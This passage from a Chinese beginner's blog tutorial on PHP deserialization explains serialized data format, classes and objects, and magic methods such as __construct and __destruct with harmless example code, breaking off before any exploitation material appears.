{"title":"从零基础入门PHP反序列化","uid":"7521324f3a376c53e83c35f44da3ffc9","slug":"从零基础入门PHP反序列化","date":"2022-06-17T07:28:30.000Z","updated":"2024-02-14T07:50:26.000Z","comments":true,"path":"api/articles/从零基础入门PHP反序列化.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141547720.png","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>反序列化是一个尤为重要的知识点，最近对反序列化进行了简单学习，并总结如下，希望能对正在学习的师傅有所帮助。</p>\n<h1 id=\"前提\"><a href=\"#前提\" class=\"headerlink\" title=\"前提\"></a>前提</h1><h2 id=\"了解序列化和反序列化\"><a href=\"#了解序列化和反序列化\" class=\"headerlink\" title=\"了解序列化和反序列化\"></a>了解序列化和反序列化</h2><p>学习反序列化之前，首先要知道序列化，简单的举个栗子来说</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'quan9i'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"----------初始数据------------&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"-----------序列化后的数据-----------&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"-----------反序列化序列化数据后的数据-----------&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545468.png\" alt=\"在这里插入图片描述\"></p>\n<p>序列化就是使数据持久化存储，因为数据用过后就会自动销毁，本来是无法进行存储的，当序列化时，就会把数据存储起来，而反序列化呢就是把序列化的数据恢复成最初的状态。<br>这里你会发现序列化的数据它带有<code>s:6</code>，其实是<code>string</code>型，<code>6个字母</code>的意思，对此再举个栗子</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">xianzhi</span><span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//创建一个类，类名为xianzhi</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'19'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//定义公共变量age，并赋值19</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'quan9i'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//定义公共变量name，并赋值quan9i</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//定义construct魔术函数,实例化此类时就会调用此方法</span>\n    <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'xianzhi  '</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">' is '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">age</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">' years old&lt;br>'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//调用两个属性，输出一句话</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">xianzhi</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//实例化对象</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//输出序列化后的</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时的输出结果</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">xianzhi quan9i is <span class=\"token number\">19</span> years old\n<span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">7</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"xianzhi\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"age\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"19\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"quan9i\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>此时就可以看出序列化后这里有多个字母，下面依次来进行解释</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">7</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"xianzhi\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"age\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"19\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"quan9i\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n对象类型<span class=\"token punctuation\">:</span>长度：类名：变量个数<span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>类型<span class=\"token punctuation\">:</span>长度<span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"值\"</span><span class=\"token punctuation\">;</span>类型<span class=\"token punctuation\">:</span>长度<span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"值\"</span><span class=\"token punctuation\">;</span>类型<span class=\"token punctuation\">:</span>长度<span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"值\"</span><span class=\"token punctuation\">;</span>类型<span class=\"token punctuation\">:</span>长度<span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"值\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>字母的含义如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">a <span class=\"token operator\">-</span> <span class=\"token keyword type-declaration\">array</span>                  b <span class=\"token operator\">-</span> boolean  \nd <span class=\"token operator\">-</span> double                 i <span class=\"token operator\">-</span> integer\no <span class=\"token operator\">-</span> common <span class=\"token keyword type-declaration\">object</span>          r <span class=\"token operator\">-</span> reference\ns <span class=\"token operator\">-</span> <span class=\"token keyword type-declaration\">string</span>                 <span class=\"token constant\">C</span> <span class=\"token operator\">-</span> custom <span class=\"token keyword type-declaration\">object</span>\n<span class=\"token constant\">O</span> <span class=\"token operator\">-</span> <span class=\"token keyword\">class</span>                  <span class=\"token class-name-definition class-name\">N</span> <span class=\"token operator\">-</span> <span class=\"token constant\">null</span>\n<span class=\"token constant\">R</span> <span class=\"token operator\">-</span> pointer reference      <span class=\"token constant\">U</span> <span class=\"token operator\">-</span> unicode <span class=\"token keyword type-declaration\">string</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>正常遇到的这种反序列化和序列化都是和PHP类与对象这部分知识点相关联的，所以我们需要简单了解类和对象这个知识点，同时掌握魔术方法的基础用法</p>\n<h2 id=\"面向对象（部分）\"><a href=\"#面向对象（部分）\" class=\"headerlink\" title=\"面向对象（部分）\"></a>面向对象（部分）</h2><h3 id=\"类\"><a href=\"#类\" class=\"headerlink\" title=\"类\"></a>类</h3><p>类− 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。<br>举个例子，全部的小狗就是一个类,代码实例如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">phpClass</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//phpClass是这个类的名字，类在定义时需要加上class</span>\n  <span class=\"token keyword\">var</span> <span class=\"token variable\">$var1</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//成员变量，名字是var1</span>\n  <span class=\"token keyword\">var</span> <span class=\"token variable\">$var2</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"constant string\"</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//成员变量</span>\n \n  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">myfunc</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$arg1</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$arg2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//定义成员函数</span>\n     <span class=\"token punctuation\">[</span><span class=\"token operator\">.</span><span class=\"token operator\">.</span><span class=\"token punctuation\">]</span><span class=\"token comment\">//函数中的内容</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">[</span><span class=\"token operator\">.</span><span class=\"token operator\">.</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span>\n官方解析如下：\n类使用 class 关键字后加上类名定义。\n \n类名后的一对大括号(&#123;&#125;)内可以定义变量和方法。\n \n类的变量使用 var 来声明, 变量也可以初始化值。\n \n函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"对象\"><a href=\"#对象\" class=\"headerlink\" title=\"对象\"></a>对象</h3><p>对象− 是类的实例。<br>全部的小狗只是一个虚拟化的东西，当面前有一只狗时，我们就可以说这个狗是一个对象。<br>类和对象简单理解如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$mercedes</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Car</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// Car()在这里是个类名，new +类名可以实例化一个对象，这里的$mercedes就是我们的对象名</span>\n<span class=\"token variable\">$bmw</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Car</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$audi</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Car</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545499.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"成员变量\"><a href=\"#成员变量\" class=\"headerlink\" title=\"成员变量\"></a>成员变量</h3><p>成员变量− 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性。</p>\n<h3 id=\"成员函数\"><a href=\"#成员函数\" class=\"headerlink\" title=\"成员函数\"></a>成员函数</h3><p>成员函数− 定义在类的内部，可用于访问对象的数据。</p>\n<h3 id=\"完整构造过程\"><a href=\"#完整构造过程\" class=\"headerlink\" title=\"完整构造过程\"></a>完整构造过程</h3><h4 id=\"定义类\"><a href=\"#定义类\" class=\"headerlink\" title=\"定义类\"></a>定义类</h4><p>此时大致知道了类的组成，我们来看一个实例，实例如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Site</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token comment\">/* 成员变量 */</span>\n  <span class=\"token keyword\">var</span> <span class=\"token variable\">$url</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">var</span> <span class=\"token variable\">$title</span><span class=\"token punctuation\">;</span>\n \n  <span class=\"token comment\">/* 成员函数 */</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">setUrl</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$par</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//设置url方法</span>\n     <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">url</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$par</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n \n  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getUrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//获取url方法</span>\n     <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">url</span> <span class=\"token operator\">.</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n \n  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">setTitle</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$par</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//设置标题方法</span>\n     <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">title</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$par</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n \n  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getTitle</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//获取标题方法</span>\n     <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">title</span> <span class=\"token operator\">.</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"创建对象\"><a href=\"#创建对象\" class=\"headerlink\" title=\"创建对象\"></a>创建对象</h4><p>前面我们定义了一个类，它的类名是Site，那这里我们想要把它变成对象，该怎么办呢，这时候就可以用new +类名来实例化对象</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$php</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Site</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//创建了对象php</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h4 id=\"调用成员方法\"><a href=\"#调用成员方法\" class=\"headerlink\" title=\"调用成员方法\"></a>调用成员方法</h4><p>此时拥有了对象，那我们就可以使用该对象调用成员方法，该对象的成员方法只能操作该对象的成员变量</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$php</span><span class=\"token operator\">-></span><span class=\"token function\">setUrl</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"www.php.cn\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//调用设置url方法并赋值</span>\n<span class=\"token variable\">$php</span><span class=\"token operator\">-></span><span class=\"token function\">setTitle</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'PHP中文网'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//调用设置title方法并赋值</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>此时我们再用剩下的两个获取方法</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$php</span><span class=\"token operator\">-></span><span class=\"token function\">getUrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$php</span><span class=\"token operator\">-></span><span class=\"token function\">getTitle</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>此时就构造完了，我们把语句总合到一起，也就是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Site</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token comment\">/* 成员变量 */</span>\n  <span class=\"token keyword\">var</span> <span class=\"token variable\">$url</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">var</span> <span class=\"token variable\">$title</span><span class=\"token punctuation\">;</span>\n \n  <span class=\"token comment\">/* 成员函数 */</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">setUrl</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$par</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//设置url方法</span>\n     <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">url</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$par</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n \n  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getUrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//获取url方法</span>\n     <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">url</span> <span class=\"token operator\">.</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n \n  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">setTitle</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$par</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//设置标题方法</span>\n     <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">title</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$par</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n \n  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getTitle</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//获取标题方法</span>\n     <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">title</span> <span class=\"token operator\">.</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$php</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Site</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//创建了对象php</span>\n<span class=\"token variable\">$php</span><span class=\"token operator\">-></span><span class=\"token function\">setUrl</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"www.php.cn\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//调用设置url方法并赋值</span>\n<span class=\"token variable\">$php</span><span class=\"token operator\">-></span><span class=\"token function\">setTitle</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'PHP中文网'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//调用设置title方法并赋值</span>\n<span class=\"token variable\">$php</span><span class=\"token operator\">-></span><span class=\"token function\">getUrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$php</span><span class=\"token operator\">-></span><span class=\"token function\">getTitle</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>结果如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545740.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"魔术方法\"><a href=\"#魔术方法\" class=\"headerlink\" title=\"魔术方法\"></a>魔术方法</h2><p>常见魔术方法有以下几种</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>   当一个对象创建时被调用，\n<span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>   当一个对象销毁时被调用，\n<span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>   当一个对象被当作一个字符串被调用。\n<span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>   使用unserialize时触发\n<span class=\"token function\">__sleep</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>    使用serialize时触发\n<span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>    对象被销毁时触发\n<span class=\"token function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>    在对象上下文中调用不可访问的方法时触发\n<span class=\"token function\">__callStatic</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>    在静态上下文中调用不可访问的方法时触发\n<span class=\"token function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>    用于从不可访问的属性读取数据\n<span class=\"token function\">__set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>    用于将数据写入不可访问的属性\n<span class=\"token function\">__isset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>    在不可访问的属性上调用<span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>或<span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>触发\n<span class=\"token function\">__unset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>     在不可访问的属性上使用<span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>时触发\n<span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>    把类当作字符串使用时触发<span class=\"token punctuation\">,</span>返回值需要为字符串\n<span class=\"token function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>   当脚本尝试将对象调用为函数时触发<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这是整体的，但这样看似乎显得过于抽象，因此我们将其进行分类，依次进行举例讲解</p>\n<h3 id=\"construct-与-destruct\"><a href=\"#construct-与-destruct\" class=\"headerlink\" title=\"__construct()与__destruct()\"></a>__construct()与__destruct()</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">__construct ： 在创建对象时候初始化对象，一般用于对变量赋初值。\n__destruct ： 和构造函数相反，当对象所在函数调用完毕后执行。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">bai</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"__construct()初始化&lt;br>\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">age</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"__destruct()执行结束\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\t\t\n <span class=\"token punctuation\">&#125;</span>\n <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">bai</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//创建一个对象命名为a</span>\n <span class=\"token comment\">/*\n 赋值\n $a->name='quan9i'; //给对象a里的name赋值为quan9i\n $a->age=19; //给对象a里的age赋值为19\n echo(serialize($a)); //输出序列化后的$a\n */</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545455.png\" alt=\"在这里插入图片描述\"><br>但这是一种，<code>__destruct</code>还有一种利用方式，就是<code>__destruct()    